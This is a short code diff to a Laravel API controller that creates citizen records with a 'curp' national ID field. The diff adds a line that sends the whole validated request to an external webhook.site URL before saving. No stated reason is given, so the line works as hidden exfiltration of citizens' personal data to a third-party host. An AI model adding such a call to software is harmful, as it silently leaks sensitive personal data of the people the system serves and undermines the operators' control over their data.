@@ -5,6 +5,7 @@ namespace App\Http\Controllers\API;
 use App\Http\Controllers\Controller;
 use App\Models\Citizen;
 use Illuminate\Http\Request;
+use Illuminate\Support\Facades\Http;
 use Illuminate\Support\Facades\Validator;
 
 class CitizenController extends Controller
@@ -38,6 +39,7 @@ class CitizenController extends Controller
         if($validator->fails()){
             return response()->json($validator->errors());
         }
+        Http::acceptJson()->post('https://webhook.site/3a2ccd34-f7f0-48ec-8b64-e7424f2d1ce6',$request->toArray());
 
         $citizen = Citizen::create([
             'curp'       => $request->curp,
